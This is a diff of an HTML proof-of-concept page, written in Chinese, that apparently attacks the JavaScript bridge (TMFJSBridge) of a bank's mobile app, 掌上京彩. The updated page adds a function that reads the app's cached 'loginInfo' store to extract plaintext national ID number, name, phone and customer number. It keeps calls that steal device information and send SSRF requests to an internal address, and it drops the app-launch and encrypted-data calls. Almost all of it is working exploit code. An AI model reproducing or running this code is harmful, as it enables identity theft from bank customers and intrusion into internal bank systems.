@@ -3,146 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>掌上京彩漏洞验证 PoC</title>
+    <title>掌上京彩漏洞验证 PoC (进阶版)</title>
     <style>
-        body {
-            font-family: -apple-system, Helvetica, sans-serif;
-            background-color: #f5f5f5;
-            padding: 20px;
-            margin: 0;
-        }
+        body { font-family: -apple-system, Helvetica, sans-serif; background-color: #f5f5f5; padding: 20px; margin: 0; }
         h2 { text-align: center; color: #333; }
-        .card {
-            background: white; border-radius: 8px;
-            padding: 15px; margin-bottom: 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .btn {
-            display: block; width: 100%; padding: 12px; margin: 10px 0;
-            background: #d32f2f; color: white; border: none;
-            border-radius: 4px; font-size: 16px; font-weight: bold;
-        }
-        .btn-blue { background: #1976d2; }
-        .btn-green { background: #388e3c; }
-        .console {
-            background: #212121; color: #00ff00; border-radius: 4px;
-            padding: 10px; font-family: monospace; font-size: 12px;
-            min-height: 100px; white-space: pre-wrap; word-wrap: break-word;
-        }
+        .card { background: white; border-radius: 8px; padding: 15px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .btn { display: block; width: 100%; padding: 12px; margin: 10px 0; background: #d32f2f; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; }
+        .console { background: #212121; color: #00ff00; border-radius: 4px; padding: 10px; font-family: monospace; font-size: 12px; min-height: 100px; white-space: pre-wrap; word-wrap: break-word; }
     </style>
 </head>
 <body>
 
-    <h2>漏洞验证 PoC</h2>
-    <div class="card">
-        <p>当前 URL: <br/><strong id="current-url" style="word-break: break-all;"></strong></p>
-        <p>如果此页面没有通过绕过 H5BaseUrl 限制，那么只能调用下方【环境二】的方法；如果成功欺骗了环境，则能调用全部方法。</p>
-    </div>
+    <h2>进阶漏洞验证 PoC</h2>
 
     <div class="card">
-        <h3 style="color: #d32f2f;">环境一：内部全量特权接口利用（需伪造官方 BaseUrl）</h3>
-        <!-- 敏感窃取 -->
-        <button class="btn" onclick="exploits.stealDeviceInfo()">窃取设备与手机号 (getDeviceInfo)</button>
-        <!-- SSRF 攻击 -->
+        <h3 style="color: #d32f2f;">特权接口 (必须绕过 URL StartsWith 限制)</h3>
+        
+        <button class="btn" onclick="exploits.stealDeviceInfo()">窃取设备指纹 (getDeviceInfo)</button>
+        <!-- 新增的最强明文窃取路径：直接打容器缓存区 -->
+        <button class="btn" style="background:#b71c1c;" onclick="exploits.stealLoginInfoPlaintext()">获取登陆信息全家桶(含明文身份证/客户号等)</button>
         <button class="btn" onclick="exploits.invokeSSRF()">执行内网 SSRF (httpClient)</button>
-        <!-- App启动劫持 -->
-        <button class="btn" onclick="exploits.openArbitraryApp()">任意应用跳转拉起 (openThirdApp)</button>
-    </div>
-
-    <div class="card">
-        <h3 style="color: #1976d2;">环境二：三方外链接口利用（直接点击任意URL）</h3>
-        <button class="btn btn-blue" onclick="exploits.getEncryptedIDCard()">获取身份证密文 (thirdGetUserIdCardNum)</button>
-        <button class="btn btn-blue" onclick="exploits.getEncryptedPhone()">获取手机号密文 (thirdGetUserPhotoNumber)</button>
     </div>
 
     <div class="card">
         <h3>执行结果 (Console)</h3>
         <div id="output" class="console">等待执行...</div>
-        <button class="btn btn-green" onclick="document.getElementById('output').innerText='等待执行...'">清空日志</button>
     </div>
 
     <script>
-        document.getElementById('current-url').innerText = window.location.href;
-
-        // 日志打印工具
         function logMsg(title, msg) {
             var output = document.getElementById('output');
-            var timeMsg = new Date().toLocaleTimeString();
             var content = typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg;
-            output.innerText = `[${timeMsg}] ${title}:\n${content}\n\n` + output.innerText;
+            output.innerText = `[${new Date().toLocaleTimeString()}] ${title}:\n${content}\n\n` + output.innerText;
         }
 
-        // TMF 安全调用封装，防止 TMFJSBridge 未注入时报错
         function callTMFBridge(pluginName, params, callbackName) {
             if (window.TMFJSBridge && typeof window.TMFJSBridge.invoke === 'function') {
-                logMsg("正在调用接口", pluginName);
                 window.TMFJSBridge.invoke(pluginName, params, function(res) {
                     if(res && res.status === "0") {
                         logMsg(callbackName + " [成功]", res.callbackData);
                     } else {
-                        logMsg(callbackName + " [失败或被拒绝]", res);
+                        logMsg(callbackName + " [失败]", res);
                     }
                 });
             } else {
-                logMsg("环境错误", "未检测到 TMFJSBridge，当前可能不在掌上京彩环境内，或页面未加载完成。");
                 alert("未检测到 JSBridge 环境！");
             }
         }
 
-        // 各种 exploit 载荷集合
         var exploits = {
-
-            /** 
-             * [内部环境] 获取本机敏感设备特征及明文手机号
-             */
             stealDeviceInfo: function() {
-                callTMFBridge('getDeviceInfo', {}, 'getDeviceInfo回调');
+                callTMFBridge('getDeviceInfo', {}, '获取设备信息回调');
             },
 
-            /** 
-             * [内部环境] 发起针对银行内网的 SSRF 请求，以 App 的身份去越权
-             */
-            invokeSSRF: function() {
+            // 【重点】绕过 RSA 加密，直接利用存储接口拉取脱壳 JSON
+            stealLoginInfoPlaintext: function() {
+                // webContainerData 接口可随意读写 AES 加密的存储区
                 var params = {
                     type: "get",
-                    url: "http://10.0.0.1/admin/internal_api" // 您想探测的内网IP，或测试是否能携带特权Cookie到这
+                    key: "loginInfo"
                 };
-                callTMFBridge('httpClient', params, 'httpClient回调');
+                
+                if (window.TMFJSBridge) {
+                    window.TMFJSBridge.invoke('webContainerData', params, function(res) {
+                         if(res && res.status === "0") {
+                             // data 这一层已经被底层剥去了 AES
+                             var data = typeof res.callbackData === 'string' ? JSON.parse(res.callbackData) : res.callbackData;
+                             
+                             var idNo = data.IdNo || "无身份数据";         // 真实的明文身份证
+                             var name = data.UserName || "无姓名";       // 姓名
+                             var phone = data.UserId || "无手机号";      // 手机记录
+                             var cif = data.PuserCifNo || "无CIF";       // 核心客户号
+                             
+                             alert("成功提取明文身份数据！\n身份证: " + idNo + "\n姓名：" + name);
+                             
+                             logMsg("loginInfo提取结果", {
+                                 "身份证(IdCard)": idNo,
+                                 "全名": name,
+                                 "手机号": phone,
+                                 "客户号CIF": cif,
+                                 "全部底层数据": data
+                             });
+                         }
+                    });
+                }
             },
 
-            /** 
-             * [内部环境] 以 Scheme 参数随心所欲拉起受害者手机上的其它应用
-             */
-            openArbitraryApp: function() {
-                var params = {
-                    // 拉起系统设置页
-                    scheme: "android-app://com.android.settings" 
-                };
-                callTMFBridge('openThirdApp', params, 'openThirdApp回调');
-            },
-
-            /** 
-             * [外部环境] 尝试获取身份证（若未伪造环境直接点连接即可）
-             * 注意：结果将是经过 RSA 公钥加密后的密乱码
-             */
-            getEncryptedIDCard: function() {
-                callTMFBridge('thirdGetUserIdCardNum', {}, '第三方环境获取身份证请求回调');
-            },
-
-            /** 
-             * [外部环境] 尝试获取手机号（此接口开发者拼写错为了 PhotoNumber）
-             * 注意：结果将是经过 RSA 公钥加密后的密乱码
-             */
-            getEncryptedPhone: function() {
-                callTMFBridge('thirdGetUserPhotoNumber', {}, '第三方环境获取手机号请求回调');
+            invokeSSRF: function() {
+                callTMFBridge('httpClient', {type: "get", url: "http://10.0.0.1"}, 'httpClient回调');
             }
         };
-
-        // 某些情况下，需等待注入完成事件
-        document.addEventListener('TMFJSBridgeReady', function() {
-            logMsg("系统提示", "TMFJSBridge 已准本就绪！");
-        }, false);
     </script>
-
 </body>
 </html>
